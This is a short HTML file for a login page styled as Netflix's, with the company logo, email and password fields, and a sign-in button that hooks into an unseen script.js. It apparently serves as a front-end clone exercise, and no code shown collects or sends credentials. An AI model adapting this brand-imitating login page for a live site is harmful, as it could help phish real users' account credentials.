<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Netflix - Login</title>
    <link rel="stylesheet" href="style.css"> <!-- Ensure the correct CSS filename -->
    <script defer src="script.js"></script> <!-- Include JavaScript -->
</head>
<body>
    <div class="container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/7/7a/Logonetflix.png" class="logo" alt="Netflix Logo">
        <h2>Sign In</h2>
        <input type="email" id="email" class="input-field" placeholder="Email or phone number" required>
        <input type="password" id="password" class="input-field" placeholder="Password" required>
        <button id="loginBtn" class="btn">Sign In</button> <!-- Added ID for JS -->
        <p class="bottom-text"><a href="#">Forgot password?</a></p>
    </div>
</body>
</html>
